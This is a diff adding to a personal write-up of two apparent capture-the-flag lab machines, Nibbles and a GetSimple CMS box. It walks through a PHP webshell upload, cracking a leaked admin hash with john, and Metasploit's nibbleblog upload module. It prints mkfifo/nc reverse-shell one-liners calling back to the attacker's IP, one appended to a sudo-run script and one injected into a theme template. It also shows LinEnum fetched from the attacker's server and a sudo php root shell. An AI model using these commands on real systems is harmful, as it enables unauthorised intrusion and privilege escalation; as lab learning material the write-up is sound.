@@ -445,6 +445,7 @@ This confirmes the presence of an admin.php page and a readme page. The readme c
    <user username="admin">
 ```
 password is just name of the box nibbles one of those things where lucky guess and inference take the day.
+
 **Step 4** Land on the box
 Once we have logged into the admin portal we find we can uplaod an image with one of the plugins. Instead of an image we can uplaod a php webshell. To test this we upload **shell.php** containing --
 ```php
@@ -463,3 +464,179 @@ We can than launch a nc listener on 4444 to catch the reverse shell when execute
 nc -lvnp 4444
 ```
 From there there we browse again to the old shell location which instantly spawns a reverse shell showing our user flag in the working dir. 
+
+The shell needs to be upgraded so I updatted the TTY via
+```python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+From there we can look for interesting files, or we can use LinEnum to enumerate interesting files permissions on the system. To get LinEnum I did the following --
+```
+Downloaded - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+Hosted Python web server to server enum script to host
+```bash
+ server - sudo python3 -m http.server 8080
+```
+Pulled down linenum script
+```bash
+wget http://10.10.15.241:8080/linenum.sh
+```
+Set script as executable
+```bash
+chmod +x linenum.sh
+```
+Executed the script which showed a file could be launched as sudo --
+```
+
+[+] Possible sudo pwnage!
+/home/nibbler/personal/stuff/monitor.sh
+
+```
+From there got a reverse shell of root by appending a reverse shell to the end of the file and executing the file.
+```bash
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.241 4445 >/tmp/f' | tee -a monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh 
+```
+After that is was straight forward just spin up a nc listener on 4445 catch the root shell and find root.txt
+
+# Alternate Escelation method
+Metasploit Commands
+```
+msf6 > search nibbleblog
+msf6 > use 0
+msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.200.170
+msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.15.241
+msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
+msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
+msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
+msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
+msf6 exploit(multi/http/nibbleblog_file_upload) > show options
+msf6 exploit(multi/http/nibbleblog_file_upload) > run
+[*] Started reverse TCP handler on 10.10.15.241:4444 
+```
+
+
+# **Wrapping it up Unguided Box**
+Started with NMAP Scan
+```bash
+nmap -sV -sC  10.129.42.249
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
+|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
+|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Welcome to GetSimple! - gettingstarted
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/admin/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Web server and ssh, cool let go see whats on the webserver
+```bash
+└─$ whatweb http://10.129.42.249   
+
+http://10.129.42.249 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.42.249], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
+```
+Nothing really of interest on the page, pivoted to gobuster -
+```bash
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.129.42.249 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.42.249
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
+/backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
+/data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]
+/index.php            (Status: 200) [Size: 5485]
+/plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
+/robots.txt           (Status: 200) [Size: 32]
+/server-status        (Status: 403) [Size: 278]
+/sitemap.xml          (Status: 200) [Size: 431]
+/theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/]
+Progress: 4746 / 4747 (99.98%)
+===============================================================
+Finished
+===============================================================
+```                                                              
+Login Page - http://10.129.42.249/admin/
+Backups empty - http://10.129.42.249/backups/
+Data - interesting, had admin user and pass
+```
+{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
+<apikey>4f399dc72ff8e619e327800f851e9986</apikey>
+<USR>admin</USR>
+<NAME/>
+<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
+<EMAIL>admin@gettingstarted.com</EMAIL>
+```
+That shows we have an admin account name, with a hashed password john should make quick work of that.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=/home/kali/Desktop/rockyou.txt  pwd.txt 
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
+Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
+Use the "--format=ripemd-160" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
+Use the "--format=has-160" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin            (?)     
+1g 0:00:00:00 DONE (2025-11-29 12:03) 100.0g/s 1982Kp/s 1982Kc/s 1982KC/s akusayangkamu..TYRONE
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed. 
+```
+So back to the login portal with u: admin pw: admin
+From there the pannel with a theme template we could modify seemed promising
+http://10.129.42.249/admin/theme-edit.php?t=Innovation&f=template.php
+I was able to edit the theme and place a reverse shell on the beginning of the php script.
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.241 4445 >/tmp/f"); ?>
+```
+From there all I had to do was setup a nc listener and trigger the shell by browsing back to
+http://10.129.42.249/index.php
+This got us a shell on the box. Which I than upgraded the TTY shell with 
+```python 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+From there I started seeing what folders were r/w able I moved into the tmp dir and pulled down linenum to check for priv esc vectors. 
+```bash
+www-data@gettingstarted:/tmp/new$ wget http://10.10.15.241:8000/linenum.sh    
+www-data@gettingstarted:/tmp/new$ chmod +x linenum.sh
+www-data@gettingstarted:/tmp/new$ ./linenum.sh
+```
+This found!
+```
+[+] Possible sudo pwnage!
+/usr/bin/php
+```
+The easiest priv esc ever. 
+```bash
+sudo php -r 'system("/bin/bash");'
+```
+That used php to spawn a root shell. Than it was a matter of just go find the flags :). 
+```bash
+find / -name "user.txt" 2>/dev/null
+find / -name "root.txt" 2>/dev/null
+```
